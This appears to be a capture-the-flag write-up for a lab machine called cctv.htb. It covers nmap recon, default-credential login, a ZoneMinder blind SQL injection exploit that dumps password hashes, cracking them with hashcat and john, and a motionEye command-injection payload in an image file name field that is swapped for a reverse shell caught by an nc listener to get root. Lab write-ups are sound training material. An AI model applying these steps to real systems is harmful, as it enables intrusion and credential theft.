```bash
Preview all results? (Y/n) y

== nmap_results.txt ==
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 10:29 -0400
Nmap scan report for cctv.htb (10.129.21.90)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.48 seconds

============================================
  RECON SUMMARY
  Target:    10.129.21.90
  DNS:       cctv.htb
  Generated: 2026-04-04 10:30:39
============================================

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
  80/tcp   http         Apache httpd 2.4.58

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   none
  HTTPS:  none

--------------------------------------------
  SUBDOMAINS  (0 found)
--------------------------------------------
  none

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  

============================================

=== Done! Results: /home/kali/github/ctf_tool/results/cctv.htb/ ===
```
Ok so we got ssh and a website apache. It's a cctv website and there is a login panel.

```bash
ZoneMinder Login
The default username for ZoneMinder is
admin and the default password is admin.
```
We were able to login via default credentials.

It's on version v1.37.63 Let's see if there is an exploit for it.


https://nvd.nist.gov/vuln/detail/CVE-2024-51482

Ok so its vulnerable to boolean sql injection. Let's see if there is a proof-of-concept for this. 

```bash
python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --dump zm Users "Username,Password" --debug
[*] CVE-2024-51482 - ZoneMinder Blind SQL Injection Exploit
[*] Target: cctv.htb

[*] Logging in as 'admin' on cctv.htb...
[+] Login successful
[*] Measuring baseline response time...
[*] Baseline median: 0.070s
[*] Testing vulnerability with 2s sleep...
[*] Response time: 2.08s
[+] Target is vulnerable!
[*] Dumping data from 'zm.Users'...

{'Username':'admin','Password': '$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm'}
{'Username': 'mark', 'Password': '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG'}
{'Username': 'superadmin', 'Password': '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m'}
```

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --username --show
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
superadmin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
```

ok so we got 2 credentials

mark:opensesame
superadmin:admin

we were able to login via ssh to mark. I checked the ports running on localhost.
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
I got a motioneye login screen.

The motioneye version is 4.7.1 and apparently there is a RCE
I tried the default credentials but they didn't work. I did some recon and found them
```bash
mark@cctv:/etc/motioneye$ cat motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```
We have to crack the pass with hashcat again.

```bash
 hashid -m hash                                                          
--File 'hash'--
Analyzing '989c5a8ee87a0e9521ec81a79187d162109282f0'
[+] SHA-1 [Hashcat Mode: 100]
[+] Double SHA-1 [Hashcat Mode: 4500]
[+] RIPEMD-160 [Hashcat Mode: 6000]
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn [Hashcat Mode: 190]
[+] Skein-256(160) 
[+] Skein-512(160) 
--End of file 'hash'--  
```
It's sha-1 so lets crack it

```bash
john --format=raw-sha1 hash --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2026-04-04 12:48) 0g/s 30517Kp/s 30517Kc/s 30517KC/s      54321..*7¡Vamos!
Session completed. 
```

For some reason i wasn't able to login via the cracked password so I tried with the hash and was able to log in. Quite stupid.

https://www.exploit-db.com/exploits/52481
Let's get a root shell with the RCE

```bash
 Reproduction (manual + safe PoC):
# A) Bypass client-side validation in browser console:
#    1) Open browser devtools on the dashboard (F12 / Ctrl+Shift+I).
#    2) In the Console tab paste and run:
#
#       configUiValid = function() { return true; };
#
#    This forces the UI validation function to always return true and allows any value
#    to be accepted by the UI forms.
#
# B) Safe payload (paste this into Settings → Still Images → Image File Name and Apply):
#    $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```

We just switch the example payload with a reverse shell and set up a listener


```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.175] from (UNKNOWN) [10.129.21.90] 57876
bash: cannot set terminal process group (9484): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# id       
id
uid=0(root) gid=0(root) groups=0(root)
root@cctv:/etc/motioneye# cat /root/root.txt
cat /root/root.txt
72716d56e6ed88bebfcf17e0926c118b
root@cctv:/etc/motioneye# cat /home/sa_mark/user.txt
cat /home/sa_mark/user.txt
474f3e879e3e10fb40bcfcbc990649b6
root@cctv:/etc/motioneye# 
```
The machine was quite fun but it was quite hard to keep up with all the config files.



